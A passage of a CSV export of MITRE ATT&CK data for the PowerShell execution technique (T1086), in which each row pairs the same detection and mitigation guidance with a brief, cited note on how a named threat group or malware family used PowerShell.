Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
254,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0145|POWERSOURCE]] is a PowerShell backdoor.[[CiteRef::FireEye FIN7 March 2017]][[CiteRef::Cisco DNSMessenger March 2017]]'],['FIN7'],['FIN7'],['G0046'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: POWERSOURCE, DNSMessenger",['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
255,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0151|HALFBAKED]] can execute PowerShell scripts.[[CiteRef::FireEye FIN7 April 2017]]'],['FIN7'],['FIN7'],['G0046'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: HALFBAKED,['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
256,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0046|FIN7]] uses a PowerShell script to launch shellcode that retrieves an additional payload.[[CiteRef::FireEye FIN7 April 2017]][[CiteRef::Morphisec FIN7 June 2017]]'],['FIN7'],['FIN7'],['G0046'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
257,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0129|AutoIt]] downloads a PowerShell script that decodes to a typical shellcode loader.[[CiteRef::Forcepoint Monsoon]]'],['MONSOON'],"['MONSOON', 'Operation Hangover']",['G0042'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: AutoIt,['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
258,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Group/G0038|Stealth Falcon]] malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.[[CiteRef::Citizen Lab Stealth Falcon May 2016]]']",['Stealth Falcon'],['Stealth Falcon'],['G0038'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
259,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0051|FIN10]] uses PowerShell for execution as well as PowerShell Empire to establish persistence.[[CiteRef::FireEye FIN10 June 2017]][[CiteRef::Github PowerShell Empire]]'],['FIN10'],['FIN10'],['G0051'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
260,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0154|Cobalt Strike]] can execute a payload on a remote host with PowerShell.  This technique does write any data to disk.[[CiteRef::cobaltstrike manual]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: Cobalt Strike,['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
261,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0050|APT32]] has used PowerShell-based tools and shellcode loaders for execution.[[CiteRef::FireEye APT32 May 2017]]'],['APT32'],"['APT32', 'OceanLotus Group']",['G0050'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
262,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0037|FIN6]] has used a Metasploit PowerShell module to download and execute shellcode and to set up a local listener.[[CiteRef::FireEye FIN6 April 2016]]'],['FIN6'],['FIN6'],['G0037'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
263,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0037|HAMMERTOSS]] is known to use PowerShell.[[CiteRef::FireEye APT29]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: HAMMERTOSS, HammerDuke, NetDuke",['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
264,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Software/S0053|SeaDuke]] uses a module to execute Mimikatz with PowerShell to perform [[Technique/T1097|Pass the Ticket]].[[CiteRef::Symantec Seaduke 2015]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],"Software: SeaDuke, SeaDaddy, SeaDesk",['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
265,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']","['[[Software/S0150|POSHSPY]] uses PowerShell to execute various commands, one to execute its payload.[[CiteRef::FireEye POSHSPY April 2017]]']",['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],Software: POSHSPY,['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
266,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0016|APT29]] has used encoded PowerShell scripts uploaded to [[Software/S0046|CozyCar]] installations to download and install [[Software/S0053|SeaDuke]].[[CiteRef::Symantec Seaduke 2015]] [[Group/G0016|APT29]] also used PowerShell scripts to evade defenses.[[CiteRef::Mandiant No Easy Breach]]'],['APT29'],"['APT29', 'The Dukes', 'Cozy Bear']",['G0016'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
267,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']","[""The [[Group/G0033|Poseidon Group]]'s Information Gathering Tool (IGT) includes PowerShell components.[[CiteRef::Kaspersky Poseidon Group]]""]",['Poseidon Group'],['Poseidon Group'],['G0033'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
268,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0022|APT3]] has used PowerShell on victim systems to download and run payloads after exploitation.[[CiteRef::FireEye Operation Double Tap]]'],['APT3'],"['APT3', 'Gothic Panda', 'Pirpi', 'UPS Team', 'Buckeye', 'Threat Group-0110', 'TG-0110']",['G0022'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
269,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0045|menuPass]] uses PowerSploit to inject shellcode into PowerShell.[[CiteRef::PWC Cloud Hopper Technical Annex April 2017]]'],['menuPass'],"['menuPass', 'Stone Panda', 'APT10', 'Red Apollo', 'CVNX']",['G0045'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
270,"['If proper execution policy is set, adversaries will likely be able to define their own execution policy if they obtain administrator or system access, either through the Registry or at the command line. This change in policy on a system may be a way to detect malicious use of PowerShell. If PowerShell is not used in an environment, then simply looking for PowerShell execution may detect malicious activity.\n\nIt is also beneficial to turn on PowerShell logging to gain increased fidelity in what occurs during execution.[[CiteRef::Malware Archaeology PowerShell Cheat Sheet]] PowerShell 5.0 introduced enhanced logging capabilities, and some of those features have since been added to PowerShell 4.0. Earlier versions of PowerShell do not have many logging features.[[CiteRef::FireEye PowerShell Logging 2016]] An organization can gather PowerShell execution details in a data analytic platform to supplement it with other data.']",[],[],[],"['Windows Registry', 'File monitoring', 'Process command-line parameters', 'Process monitoring']",['[[Group/G0040|Patchwork]] used PowerSploit to download and run a reverse shell.[[CiteRef::Cymmetria Patchwork]]'],['Patchwork'],"['Patchwork', 'Dropping Elephant', 'Chinastrats']",['G0040'],"['It may be possible to remove PowerShell from systems when not needed, but a review should be performed to assess the impact to an environment, since it could be in use for many legitimate purposes and administrative functions. When PowerShell is necessary, restrict PowerShell execution policy to administrators and to only execute signed scripts. Be aware that there are methods of bypassing the PowerShell execution policy, depending on environment configuration.[[CiteRef::Netspi PowerShell Execution Policy Bypass]] Disable/restrict the WinRM Service to help prevent uses of PowerShell for remote execution.']","['Windows Server 2003', 'Windows Server 2008', 'Windows Server 2012', 'Windows XP', 'Windows 7', 'Windows 8', 'Windows Server 2003 R2', 'Windows Server 2008 R2', 'Windows Server 2012 R2', 'Windows Vista', 'Windows 8.1', 'Windows 10']","['User', 'Administrator']",[],[],['Execution'],['Technique/T1086'],['PowerShell'],https://attack.mitre.org/wiki/Technique/T1086
